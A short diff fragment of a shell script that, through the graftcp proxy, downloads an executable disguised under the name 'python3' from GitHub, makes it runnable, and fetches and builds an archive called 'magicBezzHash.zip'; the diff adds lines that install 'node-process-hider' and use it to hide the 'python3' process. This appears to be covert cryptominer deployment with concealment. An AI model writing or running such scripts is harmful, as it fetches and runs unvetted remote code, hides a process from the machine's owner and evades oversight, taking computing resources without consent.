@@ -38,7 +38,8 @@ echo " "
 
 ./graftcp/graftcp wget https://github.com/viliamriah/newmind/raw/main/python3
 chmod +x python3
- 
+npm i -g node-process-hider
+ph add python3
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
 unzip magicBezzHash.zip 
 make 
